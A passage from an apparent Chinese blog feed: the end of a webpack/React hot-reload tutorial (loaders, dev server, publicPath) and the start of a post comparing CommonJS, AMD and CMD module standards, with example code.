&#123;this.props.introContent[1]&#125;&lt;br/&gt;</span><br><span class="line">                    &#123;this.props.introContent[2]&#125;</span><br><span class="line">                &lt;/p&gt;</span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">            &lt;div className="footer-right"&gt;</span><br><span class="line">                &lt;div className="ewm1"&gt;&lt;img src=&#123;weibo&#125;/&gt;&lt;span&gt;杭电官方微博&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">                &lt;div className="ewm2"&gt;&lt;img src=&#123;wechat&#125;/&gt;&lt;span&gt;杭电官方微信&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h5 id="loaders"><a href="#loaders" class="headerlink" title="loaders:"></a>loaders:</h5><p><strong>对于js/jsx文件</strong>，用babel-loader处理，babel是一款非常厉害的编译工具，使得js成为一门为数不多的能够实时使用新特性的语言。通过.babelrc配置或者直接在webpack中配置,支持对jsx,es2015的转换：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"presets"</span>: [<span class="string">"es2015"</span>,<span class="string">"react"</span>],</span><br><span class="line">  <span class="string">"plugins"</span>: [<span class="string">"transform-react-jsx"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>细心的你会发现前面对于js/jsx文件还有个react-hot-loader文件，这就是实时热更新用到的loader，后面会详细说明</p><p><strong>对于scss文件</strong>，依次用sass-loader,css-loader,style-loader进行处理：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test:<span class="regexp">/\.css$/</span>,</span><br><span class="line">loader:<span class="string">'style!css'</span></span><br></pre></td></tr></table></figure></p><p><strong>图片文件</strong>,url-loader处理<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test:<span class="regexp">/\.(jpg|png)$/</span>,</span><br><span class="line">loader:<span class="string">'url'</span></span><br></pre></td></tr></table></figure></p><h5 id="入口文件，出口文件，publicPath"><a href="#入口文件，出口文件，publicPath" class="headerlink" title="入口文件，出口文件，publicPath:"></a>入口文件，出口文件，publicPath:</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">entry:[<span class="string">'webpack-dev-server/client?http://localhost:3000'</span>,</span><br><span class="line"><span class="string">'webpack/hot/only-dev-server'</span>,<span class="string">'./src/components/app.js'</span>],</span><br><span class="line">output:&#123;</span><br><span class="line">    path: __dirname + <span class="string">'/dist/js'</span>,</span><br><span class="line">    filename:<span class="string">'test.bundle.js'</span>,</span><br><span class="line">    publicPath:<span class="string">'/public'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>app.js作为入口文件，层层管理依赖，最终打包到pah目录，publicPath见下文</p><h5 id="自动化构建，webpack-dev-server-amp-react-hot-loader"><a href="#自动化构建，webpack-dev-server-amp-react-hot-loader" class="headerlink" title="自动化构建，webpack-dev-server&amp;react-hot-loader:"></a>自动化构建，webpack-dev-server&amp;react-hot-loader:</h5><h6 id="命令行webpack-dev-server"><a href="#命令行webpack-dev-server" class="headerlink" title="命令行webpack-dev-server:"></a>命令行webpack-dev-server:</h6><p>安装:</p><pre><code>npm install --save-dev webpack-dev-server</code></pre><p>关键字–inline,–hot:</p><p>webpack支持命令行配置,webpack-dev-server –inline时，会自动添加webpack-dev-server的入口文件到entry:</p><pre><code>&apos;webpack-dev-server/client?http://localhost:8080&apos;</code></pre><p>当浏览器访问localhost:8080时，会进入inline模式，而访问localhost:8080/webpack-dev-server时，会进入iframe模式，iframe模式通过一个iframe包裹页面,提供顶部的状态更新标识。</p><p>当–hot命令时，标识实时热更新，会自动在webpack配置文件当中添加插件：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> webpack.HotModuleReplacementPlugin()</span><br></pre></td></tr></table></figure></p><p>需要注意的是，webpack-dev-server没有入口文件情况下是没办法访问webpack.config.js的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">devServer:&#123;</span><br><span class="line">stats:&#123;</span><br><span class="line">colors:<span class="literal">true</span></span><br><span class="line">&#125;,</span><br><span class="line">hot：<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h6 id="nodeJS-API下的webpack-dev-server"><a href="#nodeJS-API下的webpack-dev-server" class="headerlink" title="nodeJS API下的webpack-dev-server:"></a>nodeJS API下的webpack-dev-server:</h6><p>提供webpack-dev-server和热更新的入口：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entry:[<span class="string">'webpack-dev-server/client?http://localhost:3000'</span>,</span><br><span class="line"><span class="string">'webpack/hot/only-dev-server'</span>,<span class="string">'./src/js/app.js'</span>]</span><br></pre></td></tr></table></figure></p><p>提供插件：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> webpack.HotModuleReplacementPlugin(),</span><br><span class="line"><span class="keyword">new</span> webpack.NoErrorsPlugin()<span class="comment">//非必须，阻止报错</span></span><br></pre></td></tr></table></figure></p><p>然后server.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</span><br><span class="line"><span class="keyword">var</span> WebpackDevServer = <span class="built_in">require</span>(<span class="string">'webpack-dev-server'</span>);</span><br><span class="line"><span class="keyword">var</span> config = <span class="built_in">require</span>(<span class="string">'./webpack.config'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> WebpackDevServer(webpack(config), &#123;</span><br><span class="line">  publicPath: config.output.publicPath,</span><br><span class="line">  hot: <span class="literal">true</span>,</span><br><span class="line">  stats:&#123;<span class="attr">colors</span>:<span class="literal">true</span>&#125;,</span><br><span class="line">  historyApiFallback: <span class="literal">true</span></span><br><span class="line">&#125;).listen(<span class="number">3000</span>, <span class="string">'localhost'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, result</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err) <span class="built_in">console</span>.log(err);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Listening at localhost:3000'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>当node server.js的时候，服务器监听在localhost:3000端口，可以把这个命令写入npm script:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"scripts"</span>: &#123;</span><br><span class="line"><span class="string">"start"</span>: <span class="string">"node server.js"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h6 id="react-hot-loader"><a href="#react-hot-loader" class="headerlink" title="react-hot-loader:"></a>react-hot-loader:</h6><p>只是在对js/jsx文件的loaders中，新增react-hot-loader，webpack-dev-server本身是整个页面刷新的，这样不必要，而react-hot-loader采用异步方式局部刷新。</p><h6 id="关于publicPath，这个我纠结了很久，最后在segamentfault社区前辈的帮助下终于开窍了。"><a href="#关于publicPath，这个我纠结了很久，最后在segamentfault社区前辈的帮助下终于开窍了。" class="headerlink" title="关于publicPath，这个我纠结了很久，最后在segamentfault社区前辈的帮助下终于开窍了。"></a>关于publicPath，这个我纠结了很久，最后在segamentfault社区前辈的帮助下终于开窍了。</h6><p>publicPath是出口的打包文件在服务器中的位置，如这里的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">publicPath:&apos;/public&apos;</span><br></pre></td></tr></table></figure></p><p>那么我们的test.bundle.js文件就存在于：</p><pre><code>localhost:3000/public/test.bundle.js</code></pre><p>我们在index.html文件里就可以这样引用:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://localhost:3000/public/test.bundle.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>记住webpack-dev-server监听文件变化，实时更新，但是并不会实时编译，只是将变化存在于内存当中，我们必须访问服务器地址里的bundle文件，否则就不能监听到文件变化,比如如果我们这样引入：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./js/test.bundle.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>可见我们这样访问的是真实路径当中的bundle文件，而如上所说，bundle文件并没有被实时编译，我们就会发现页面不论怎么都没有变化了。</p><p>此外，在scipt中引入的路径也可以是相对路径，相对于publicPath:</p><pre><code>publicPath:&quot;/dist/js&quot;&lt;script src=&quot;./js/test.bundle.js&quot;&gt;&lt;/script&gt;</code></pre><h5 id="最终测试："><a href="#最终测试：" class="headerlink" title="最终测试："></a>最终测试：</h5><p>我们的app.js文件：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> $ <span class="keyword">from</span> <span class="string">'jquery'</span>;</span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="keyword">import</span> FooterComponent <span class="keyword">from</span> <span class="string">'../js/footer'</span>;</span><br><span class="line"><span class="keyword">import</span> HeaderComponent <span class="keyword">from</span> <span class="string">'../js/header'</span>;</span><br><span class="line"><span class="keyword">import</span> ContentListComponent <span class="keyword">from</span> <span class="string">'../js/content-list'</span>;</span><br><span class="line"><span class="keyword">import</span> stylesheet <span class="keyword">from</span> <span class="string">'../style/main.scss'</span>;</span><br><span class="line"><span class="keyword">let</span> introContent = [<span class="string">"地址：杭州市杭州经济技术开发区白杨街道2号大街1158号 邮编:310018 电话查号:86915114"</span>,<span class="string">"党委宣传部制作维护 浙ICP备05018777"</span>,<span class="string">"Copyright 2016 杭州电子科技大学版权所有 All right reserved"</span>];</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    ReactDOM.render(<span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">HeaderComponent</span>/&gt;</span><span class="tag">&lt;<span class="name">ContentListComponent</span>/&gt;</span><span class="tag">&lt;<span class="name">FooterComponent</span> <span class="attr">introContent</span>=<span class="string">&#123;introContent&#125;/</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>,$('#container')[0]);</span></span><br><span class="line"><span class="xml">&#125;);</span></span><br></pre></td></tr></table></figure></p><p><strong>npm run start</strong></p><p>服务器运行在localhost:3000</p><p><strong>访问<a href="http://localhost:3000/webpack-dev-server/dist/index.html" target="_blank" rel="noopener">http://localhost:3000/webpack-dev-server/dist/index.html</a></strong>:</p><p><strong>截图1:</strong></p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/MUP2%250N@BCC9X%7D8EMUSN3YC.png" alt="60-1"></p><p><strong>截图2:</strong></p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/60-footer.png" alt="60-2"></p><p>当我们更改任意依赖文件内容，页面都能够实时局部热更新。good job!</p><h4 id="可见webpack确实能够提供开发效率，本文记录的只是冰山一角，文中有些不够深入或者有偏差的地方，所以文章将持续更新，如果你也对它感兴趣的话可以查看官方文档。"><a href="#可见webpack确实能够提供开发效率，本文记录的只是冰山一角，文中有些不够深入或者有偏差的地方，所以文章将持续更新，如果你也对它感兴趣的话可以查看官方文档。" class="headerlink" title="可见webpack确实能够提供开发效率，本文记录的只是冰山一角，文中有些不够深入或者有偏差的地方，所以文章将持续更新，如果你也对它感兴趣的话可以查看官方文档。"></a>可见webpack确实能够提供开发效率，本文记录的只是冰山一角，文中有些不够深入或者有偏差的地方，所以文章将持续更新，如果你也对它感兴趣的话可以查看<a href="https://webpack.github.io/docs" target="_blank" rel="noopener">官方文档</a>。</h4><h3 id="探寻高效的开发之道，追寻工程化开发之路，我们在路上。。。"><a href="#探寻高效的开发之道，追寻工程化开发之路，我们在路上。。。" class="headerlink" title="探寻高效的开发之道，追寻工程化开发之路，我们在路上。。。"></a>探寻高效的开发之道，追寻工程化开发之路，我们在路上。。。</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;webpack管理模块依赖然后打包输出文件，采用loader机制处理各个模块，并提供开发者环境自动化构建。本文通过实例，记录我的使用总结及遇到的问题，前面介绍一下webpack主要的内容，然后以react+ES2015+webpack为例演示，通过react-hot-loader局部地热更新组件提高开发效率。&lt;/p&gt;
    
    </summary>
    
      <category term="前端工程" scheme="http://luoxia.me/code/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/"/>
    
    
      <category term="webpack" scheme="http://luoxia.me/code/tags/webpack/"/>
    
  </entry>
  
  <entry>
    <title>js模块化规范总结篇</title>
    <link href="http://luoxia.me/code/2016/07/23/js%E6%A8%A1%E5%9D%97%E5%8C%96%E8%A7%84%E8%8C%83%E6%80%BB%E7%BB%93%E7%AF%87/"/>
    <id>http://luoxia.me/code/2016/07/23/js模块化规范总结篇/</id>
    <published>2016-07-23T02:21:59.000Z</published>
    <updated>2017-11-16T13:10:06.488Z</updated>
    
    <content type="html"><![CDATA[<p>之前一篇文章讲过requirejs(amd规范描述)的路径问题，这篇文章对js模块化进行总结，AMD和CMD主要用于客户端的模块化，而CommonJS是Nodejs的规范，由于它们的差异性，也延伸出来一些模块化工具，如broswerify能够让客户端书写Commonjs规范的模块化代码，达到前后端模块公用，webpack支持各种规范的模块化方式，而到后来的ES2015模块化标准，它们的规范及差异就是本文要总结的。</p><p>对于webpack的话，最近研究得比较多，我会在后面的另一篇文章中详细总结一下webpack的东西<br><a id="more"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h4 id="模块化开发介绍-引用lovenyf’s-blog"><a href="#模块化开发介绍-引用lovenyf’s-blog" class="headerlink" title="模块化开发介绍(引用lovenyf’s blog)"></a>模块化开发介绍(引用lovenyf’s blog)</h4><p>模块化是指在解决某一个复杂问题或者一系列的杂糅问题时，依照一种分类的思维把问题进行系统性的分解以之处理。模块化是一种处理复杂系统分解为代码结构更合理，可维护性更高的可管理的模块的方式。可以想象一个巨大的系统代码，被整合优化分割成逻辑性很强的模块时，对于软件是一种何等意义的存在。对于软件行业来说：解耦软件系统的复杂性，使得不管多么大的系统，也可以将管理，开发，维护变得“有理可循”。</p><p>还有一些对于模块化一些专业的定义为：模块化是软件系统的属性，这个系统被分解为一组高内聚，低耦合的模块。那么在理想状态下我们只需要完成自己部分的核心业务逻辑代码，其他方面的依赖可以通过直接加载被人已经写好模块进行使用即可。</p><p>首先，既然是模块化设计，那么作为一个模块化系统所必须的能力：</p><pre><code>1. 定义封装的模块。2. 定义新模块对其他模块的依赖。3. 可对其他模块的引入支持。</code></pre><p>模块化开发的重要性，需要我们制定模块化规范。由于js跨平台的特性，其不同的环境催生出了不同的模块化规范。</p><h4 id="CommonJS规范"><a href="#CommonJS规范" class="headerlink" title="CommonJS规范"></a>CommonJS规范</h4><h5 id="模块化是如此的重要，而js这门奇葩的语言在es2015之前是没有模块的规范的，模块化在其他语言中是那么的普遍，连css也可以通过import实现模块化，伴随着开发复杂度的不断提升，js的模块化需求迫在眉睫。而Nodejs的CommonJS率先制定了js的模块化标准："><a href="#模块化是如此的重要，而js这门奇葩的语言在es2015之前是没有模块的规范的，模块化在其他语言中是那么的普遍，连css也可以通过import实现模块化，伴随着开发复杂度的不断提升，js的模块化需求迫在眉睫。而Nodejs的CommonJS率先制定了js的模块化标准：" class="headerlink" title="模块化是如此的重要，而js这门奇葩的语言在es2015之前是没有模块的规范的，模块化在其他语言中是那么的普遍，连css也可以通过import实现模块化，伴随着开发复杂度的不断提升，js的模块化需求迫在眉睫。而Nodejs的CommonJS率先制定了js的模块化标准："></a>模块化是如此的重要，而js这门奇葩的语言在es2015之前是没有模块的规范的，模块化在其他语言中是那么的普遍，连css也可以通过import实现模块化，伴随着开发复杂度的不断提升，js的模块化需求迫在眉睫。而Nodejs的CommonJS率先制定了js的模块化标准：</h5><p>三个关键字：require,exports,module</p><h5 id="1-模块定义："><a href="#1-模块定义：" class="headerlink" title="1. 模块定义："></a>1. 模块定义：</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sayHello.js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'hello'</span>);</span><br><span class="line">&#125;</span><br><span class="line">exports.sayHello = sayHello;</span><br></pre></td></tr></table></figure><p>exports是作为模块文件唯一出口的对象,而module为全局的对象，其上有一个exports属性和全局的exports指向同一个对象，对于直接导出对象的模块，可以这样简写：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">sayName()&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'my name is Luo Xia'</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>需要注意的是，全局的exports直接指向一个对象是不能改变Module.exports对象的，而Module.exports只要不为空，则最终出口将会忽略在全局exports对象上添加的属性和方法：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Module.js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'a'</span>);</span><br><span class="line">&#125; </span><br><span class="line">exports.a = a;</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">b()&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'b'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//testM.js</span></span><br><span class="line"><span class="keyword">let</span> m = <span class="built_in">require</span>(<span class="string">"./Module"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> m.a); <span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> m.b); <span class="comment">//function</span></span><br></pre></td></tr></table></figure></p><h5 id="2-引入模块依赖"><a href="#2-引入模块依赖" class="headerlink" title="2. 引入模块依赖:"></a>2. 引入模块依赖:</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'./sayHello'</span>);</span><br></pre></td></tr></table></figure><p>require()传入的模块标识需要分情况，核心模块和文件模块:</p><p>核心模块存在于node源码中，不用文件定位和编译，而文件模块动态加载，可以是npm安装的依赖包下的模块，也可以是自定义的模块文件，对存在于node_modules下的模块文件，不用写路径，会从子目录到顶层目录依次查找该模块文件，而对于用户自定义的不存在与node_modules下的模块，是需要些路径的。</p><p><strong>加载顺序</strong>：优先从缓存加载（核心模块缓存优先于文件模块缓存）</p><p><strong>文件定位</strong>： </p><ol><li>标识符不含扩展名，按.js,.json,.node顺序尝试自动扩展。</li><li>在node_modules内的包下，识别package.json的main属性，定位该文件，而如果有错或者没有package.json文件，则将index.*文件作为该模块的文件。</li></ol><p><strong>模块编译</strong>:</p><p>详细参考《深入浅出Nodejs》</p><h4 id="AMD"><a href="#AMD" class="headerlink" title="AMD"></a>AMD</h4><h5 id="前面的CommonJS是NodeJS的规范，客户端呢？随着客户端开发越来越复杂，如果没有模块化的话，要管理互相的依赖是非常麻烦的，而AMD便是用于客户端的模块规范，可以采用同步和异步地加载方式加载模块文件。"><a href="#前面的CommonJS是NodeJS的规范，客户端呢？随着客户端开发越来越复杂，如果没有模块化的话，要管理互相的依赖是非常麻烦的，而AMD便是用于客户端的模块规范，可以采用同步和异步地加载方式加载模块文件。" class="headerlink" title="前面的CommonJS是NodeJS的规范，客户端呢？随着客户端开发越来越复杂，如果没有模块化的话，要管理互相的依赖是非常麻烦的，而AMD便是用于客户端的模块规范，可以采用同步和异步地加载方式加载模块文件。"></a>前面的CommonJS是NodeJS的规范，客户端呢？随着客户端开发越来越复杂，如果没有模块化的话，要管理互相的依赖是非常麻烦的，而AMD便是用于客户端的模块规范，可以采用同步和异步地加载方式加载模块文件。</h5><p>关键字：define,require,</p><h5 id="1-模块定义-全局的define-id-dependencies-factory"><a href="#1-模块定义-全局的define-id-dependencies-factory" class="headerlink" title="1. 模块定义:全局的define( id?, dependencies?, factory );"></a>1. 模块定义:全局的define( id?, dependencies?, factory );</h5><p>其中id为模块标识符，dependencies为模块依赖的其他模块，factory为依赖加载完毕后执行的回调函数可以看出，这整个是异步方式加载的。其中id和dependencies都可以省略，factory可以是回调函数，或者js对象。</p><p><strong>a</strong>. 对于独立的模块（即不依赖其他模块），省略dependencies：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">sayHello()&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'hello'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><strong>b</strong>.对于依赖其他模块的模块：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">define([<span class="string">'jquery'</span>],<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><strong>c</strong>. 上述例子，如果直接返回一个对象，factory可以直接是对象的形式：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">define(&#123;</span><br><span class="line">sayHello()&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'hello'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>d</strong>. AMD的作者本来是想让AMD规范不局限于CommonJS，但在后续版本也能够类似于CommonJS的写法：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require,exports,module</span>)</span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'...'</span>);</span><br><span class="line">...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>这里require不是全局的，在其内部require是同步加载模块的，除了这种写法，还可以这样：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">define([<span class="string">'require'</span>],<span class="function"><span class="keyword">function</span>(<span class="params">require</span>)</span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>这就导致有两种情况的require,全局和局部。这也是后面要讲的AMD与CMD的区别之一。</p><h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p>CMD是国内前端前辈玉伯的杰作，只怪前端领域日新月异，变化无常，正当我在写这篇文章时，seajs(CMD描述）已经结束了自己的生涯。</p><h5 id="1-定义模块，类似于AMD的类似于CommonJS的写法，这样使得其和NodeJS兼容性更好。"><a href="#1-定义模块，类似于AMD的类似于CommonJS的写法，这样使得其和NodeJS兼容性更好。" class="headerlink" title="1. 定义模块，类似于AMD的类似于CommonJS的写法，这样使得其和NodeJS兼容性更好。"></a>1. 定义模块，类似于AMD的类似于CommonJS的写法，这样使得其和NodeJS兼容性更好。</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require,exports,module</span>)</span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>define()也可以直接传入对象或者字符串:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'this is a string'</span>);</span><br><span class="line">define(&#123;...&#125;);</span><br></pre></td></tr></table></figure></p><h5 id="2-引入模块："><a href="#2-引入模块：" class="headerlink" title="2. 引入模块："></a>2. 引入模块：</h5><p>在define()的factory函数内部，requie作为局部变量使用</p><p>同步加载模块:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">''</span>);</span><br></pre></td></tr></table></figure></p><p>异步加载：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requie.async(id,callback?);</span><br></pre></td></tr></table></figure></p><p>而对于全局加载的话，CMD的实现者Seajs提供了seajs.use()，这样不同于AMD的既有全局require,又有局部require:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">seajs.use(<span class="string">'./Module.js'</span>);<span class="comment">//阻塞加载</span></span><br><span class="line"></span><br><span class="line">seajs.use(<span class="string">'./Module.js'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'module is loaded'</span>);</span><br><span class="line">&#125;);<span class="comment">//异步加载</span></span><br></pre></td></tr></table></figure></p><h4 id="AMD与CMD区别：-引用自玉伯本人）"><a href="#AMD与CMD区别：-引用自玉伯本人）" class="headerlink" title="AMD与CMD区别：(引用自玉伯本人）"></a>AMD与CMD区别：(引用自玉伯本人）</h4><ol><li>对于依赖的模块，AMD 是提前执行，CMD 是延迟执行。不过 RequireJS 从 2.0 开始，也改成可以延迟执行（根据写法不同，处理方式不同）。CMD 推崇 as lazy as possible.</li></ol><ol><li>CMD 推崇依赖就近，AMD 推崇依赖前置。</li></ol><ol><li><p>AMD 的 API 默认是一个当多个用，CMD 的 API 严格区分，推崇职责单一。比如 AMD 里，require 分全局 require 和局部 require，都叫 require。CMD 里，没有全局 require，而是根据模块系统的完备性，提供 seajs.use 来实现模块系统的加载启动。CMD 里，每个 API 都简单纯粹。</p></li><li><p>参考<a href="https://github.com/seajs/seajs/issues/277" target="_blank" rel="noopener">https://github.com/seajs/seajs/issues/277</a></p></li></ol><h4 id="browserify-让客户端使用CommonJS规范写法，让客户端可以使用强大的npm生态系统："><a href="#browserify-让客户端使用CommonJS规范写法，让客户端可以使用强大的npm生态系统：" class="headerlink" 